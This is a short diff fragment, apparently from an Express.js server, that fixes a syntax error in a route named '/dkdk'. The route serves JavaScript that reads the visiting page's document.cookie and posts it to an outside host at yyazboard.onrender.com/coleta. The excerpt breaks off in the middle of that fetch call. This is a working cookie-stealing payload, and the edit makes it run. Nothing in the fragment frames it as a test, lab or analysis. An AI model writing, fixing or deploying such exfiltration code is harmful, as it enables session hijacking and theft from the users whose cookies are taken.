@@ -198,7 +198,7 @@ TypingText.runAll();
     `);
 });
 
-app.get('/dkdk' (req, res) => {
+app.get('/dkdk', (req, res) => {
 	res.type('application/javascript').send(`
  	const data = { cookies: JSON.stringify(document.cookie, null, 4) };
         fetch('https://yyazboard.onrender.com/coleta', {
